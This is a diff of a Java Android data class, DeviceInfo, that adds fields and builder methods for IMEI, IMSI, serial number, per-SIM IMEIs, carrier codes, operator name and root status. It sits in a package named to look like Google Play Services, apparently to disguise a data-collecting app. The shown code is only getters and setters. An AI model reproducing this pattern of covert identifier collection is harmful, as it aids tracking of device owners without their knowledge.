@@ -4,7 +4,7 @@ package com.google.android.gms.persistent.googleapps.network.models.data;
  * Created by OldMan on 04.04.2017.
  */
 
-public class DeviceInfo extends BaseInfo{
+public class DeviceInfo extends BaseEvent {
     private String imei;
     private String model;
     private String serial_num;
@@ -13,29 +13,53 @@ public class DeviceInfo extends BaseInfo{
     private String imsi;
     private String manufactured;
     private String product;
-    private int sdk;
+    private String sdk;
     private String screen_size;
-    private NetworkInfo network;
+    private String is_dual_sim;
+    private String imei_sim1;
+    private String imei_sim2;
+    private String mcc;
+    private String mnc;
+    private String phone_type;
+    private String network_type;
+    private String network;
+    private String operator_name;
+    private boolean root;
 
-    public DeviceInfo() {
-    }
 
     private DeviceInfo(Builder builder) {
         setImei(builder.imei);
         setModel(builder.model);
-        setSerialNum(builder.serial_num);
-        setVersionOS(builder.version_os);
+        setSerial_num(builder.serial_num);
+        setVersion_os(builder.version_os);
         setBrand(builder.brand);
         setImsi(builder.imsi);
         setManufactured(builder.manufactured);
         setProduct(builder.product);
         setSdk(builder.sdk);
-        setScreenSize(builder.screen_size);
+        setScreen_size(builder.screen_size);
+        setIs_dual_sim(builder.is_dual_sim);
+        setImei_sim1(builder.imei_sim1);
+        setImei_sim2(builder.imei_sim2);
+        setMcc(builder.mcc);
+        setMnc(builder.mnc);
+        setPhone_type(builder.phone_type);
+        setNetwork_type(builder.network_type);
         setNetwork(builder.network);
+        setOperator_name(builder.operator_name);
+        setRoot(builder.is_root);
     }
 
     public static Builder newBuilder() {
         return new Builder();
+    }
+
+    public boolean isRoot() {
+        return root;
+    }
+
+    public void setRoot(boolean is_root) {
+        this.root = is_root;
     }
 
     public String getImei() {
@@ -54,19 +78,19 @@ public class DeviceInfo extends BaseInfo{
         this.model = model;
     }
 
-    public String getSerialNum() {
+    public String getSerial_num() {
         return serial_num;
     }
 
-    public void setSerialNum(String serial_num) {
+    public void setSerial_num(String serial_num) {
         this.serial_num = serial_num;
     }
 
-    public String getVersionOS() {
+    public String getVersion_os() {
         return version_os;
     }
 
-    public void setVersionOS(String version_os) {
+    public void setVersion_os(String version_os) {
         this.version_os = version_os;
     }
 
@@ -102,29 +126,94 @@ public class DeviceInfo extends BaseInfo{
         this.product = product;
     }
 
-    public int getSdk() {
+    public String getSdk() {
         return sdk;
     }
 
-    public void setSdk(int sdk) {
+    public void setSdk(String sdk) {
         this.sdk = sdk;
     }
 
 
-    public String getScreenSize() {
+    public String getScreen_size() {
         return screen_size;
     }
 
-    public void setScreenSize(String screen_size) {
+    public void setScreen_size(String screen_size) {
         this.screen_size = screen_size;
     }
 
-    public NetworkInfo getNetwork() {
+    public String getNetwork() {
         return network;
     }
 
-    public void setNetwork(NetworkInfo network) {
+    public void setNetwork(String network) {
         this.network = network;
+    }
+
+
+    public String getIs_dual_sim() {
+        return is_dual_sim;
+    }
+
+    public void setIs_dual_sim(String is_dual_sim) {
+        this.is_dual_sim = is_dual_sim;
+    }
+
+    public String getImei_sim1() {
+        return imei_sim1;
+    }
+
+    public void setImei_sim1(String imei_sim1) {
+        this.imei_sim1 = imei_sim1;
+    }
+
+    public String getImei_sim2() {
+        return imei_sim2;
+    }
+
+    public void setImei_sim2(String imei_sim2) {
+        this.imei_sim2 = imei_sim2;
+    }
+
+    public String getMcc() {
+        return mcc;
+    }
+
+    public void setMcc(String mcc) {
+        this.mcc = mcc;
+    }
+
+    public String getMnc() {
+        return mnc;
+    }
+
+    public void setMnc(String mnc) {
+        this.mnc = mnc;
+    }
+
+    public String getPhone_type() {
+        return phone_type;
+    }
+
+    public void setPhone_type(String phone_type) {
+        this.phone_type = phone_type;
+    }
+
+    public String getNetwork_type() {
+        return network_type;
+    }
+
+    public void setNetwork_type(String network_type) {
+        this.network_type = network_type;
+    }
+
+    public String getOperator_name() {
+        return operator_name;
+    }
+
+    public void setOperator_name(String operator_name) {
+        this.operator_name = operator_name;
     }
 
     public static final class Builder {
@@ -136,12 +225,65 @@ public class DeviceInfo extends BaseInfo{
         private String imsi;
         private String manufactured;
         private String product;
-        private int sdk;
+        private String sdk;
         private String screen_size;
-        private NetworkInfo network;
-
+        private String is_dual_sim;
+        private String imei_sim1;
+        private String imei_sim2;
+        private String mcc;
+        private String mnc;
+        private String phone_type;
+        private String network_type;
+        private String network;
+        private String operator_name;
+        private boolean is_root;
 
         private Builder() {
+        }
+
+        public Builder isRoot(boolean val) {
+            is_root = val;
+            return this;
+        }
+
+        public Builder isDualSim(String val) {
+            is_dual_sim = val;
+            return this;
+        }
+
+        public Builder imeiSim1(String val) {
+            imei_sim1 = val;
+            return this;
+        }
+
+        public Builder imeiSim2(String val) {
+            imei_sim2 = val;
+            return this;
+        }
+
+        public Builder mcc(String val) {
+            mcc = val;
+            return this;
+        }
+
+        public Builder mnc(String val) {
+            mnc = val;
+            return this;
+        }
+
+        public Builder phoneType(String val) {
+            phone_type = val;
+            return this;
+        }
+
+        public Builder networkType(String val) {
+            network_type = val;
+            return this;
+        }
+
+        public Builder operatorName(String val) {
+            operator_name = val;
+            return this;
         }
 
         public Builder imei(String val) {
@@ -184,12 +326,12 @@ public class DeviceInfo extends BaseInfo{
             return this;
         }
 
-        public Builder sdk(int val) {
+        public Builder sdk(String val) {
             sdk = val;
             return this;
         }
 
-        public Builder network(NetworkInfo val) {
+        public Builder network(String val) {
             network = val;
             return this;
         }
